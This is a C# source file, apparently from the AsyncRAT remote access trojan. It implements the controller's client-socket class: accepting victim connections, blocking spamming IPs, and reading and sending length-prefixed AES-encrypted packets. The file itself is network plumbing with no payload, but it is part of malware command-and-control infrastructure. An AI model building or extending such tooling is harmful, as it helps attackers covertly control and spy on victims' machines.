﻿using System;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.Handle_Packet;
using System.Security.Cryptography;
using System.Drawing;
using System.Diagnostics;
using System.Threading;

namespace AsyncRAT_Sharp.Sockets
{
    class Clients
    {
        public Socket ClientSocket { get; set; }
        public ListViewItem LV { get; set; }
        public string ID { get; set; }

        private byte[] ClientBuffer;
        private long ClientBuffersize;
        private bool ClientBufferRecevied;
        private MemoryStream ClientMS;
        private object SendSync;
        private object EndSendSync;
        public long BytesRecevied;

        public Clients(Socket socket)
        {
            if (Settings.Blocked.Contains(socket.RemoteEndPoint.ToString().Split(':')[0]))
            {
                Disconnected();
                return;
            }

            int count = 0;
            foreach (Clients client in Settings.Online)
            {
                if (client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0] == socket.RemoteEndPoint.ToString().Split(':')[0])
                    count++;
            }

            if (count >= 5)
            {
                Settings.Blocked.Add(socket.RemoteEndPoint.ToString().Split(':')[0]);
                HandleLogs.Addmsg($"Client {socket.RemoteEndPoint.ToString().Split(':')[0]} tried to spam, IP blocked", Color.Red);
                Disconnected();
                return;
            }

            ClientSocket = socket;
            ClientBuffer = new byte[4];
            ClientBufferRecevied = false;
            ClientMS = new MemoryStream();
            LV = null;
            SendSync = new object();
            EndSendSync = new object();
            BytesRecevied = 0;
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = ClientSocket.EndReceive(ar);
                    if (Recevied > 0)
                    {
                        if (ClientBufferRecevied == false)
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
                                ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                if (ClientBuffersize > 0)
                                {
                                    ClientBuffer = new byte[ClientBuffersize];
                                    Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
                                    ClientBufferRecevied = true;
                                }
                        }
                        else
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                            Settings.Received += Recevied;
                            BytesRecevied += Recevied;
                            if (ClientMS.Length == ClientBuffersize)
                            {
                                try
                                {
                                    ThreadPool.QueueUserWorkItem(HandlePacket.Read, new object[] { Settings.aes256.Decrypt(ClientMS.ToArray()), this });
                                }
                                catch (CryptographicException)
                                {
                                    HandleLogs.Addmsg($"Client {ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password, IP blocked", Color.Red);
                                    Settings.Blocked.Add(ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
                                    Disconnected();
                                    return;
                                }
                                ClientBuffer = new byte[4];
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBufferRecevied = false;
                            }
                            else
                                ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                        }
                        ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {

            try
            {
                if (LV != null)
                {
                    if (Program.form1.listView1.InvokeRequired)
                        Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                        {
                            LV.Remove();
                        }));
                    lock (Settings.Online)
                        Settings.Online.Remove(this);
                }
            }
            catch { }

            try
            {
                ClientMS?.Dispose();
                ClientSocket?.Dispose();
            }
            catch { }
        }

        public void BeginSend(object Msgs)
        {
            lock (SendSync)
            {
                if (ClientSocket == null)
                {
                    Disconnected();
                    return;
                }
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }

                try
                {
                    byte[] buffer = Settings.aes256.Encrypt((byte[])Msgs);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                }
                catch
                {
                    Disconnected();
                    return;
                }

            }
        }

        public void EndSend(IAsyncResult ar)
        {
            lock (EndSendSync)
            {
                try
                {
                    int sent = 0;
                    sent = ClientSocket.EndSend(ar);
                    Debug.WriteLine("/// Server Sent " + sent.ToString() + " Bytes  ///");
                    Settings.Sent += sent;
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }
    }
}
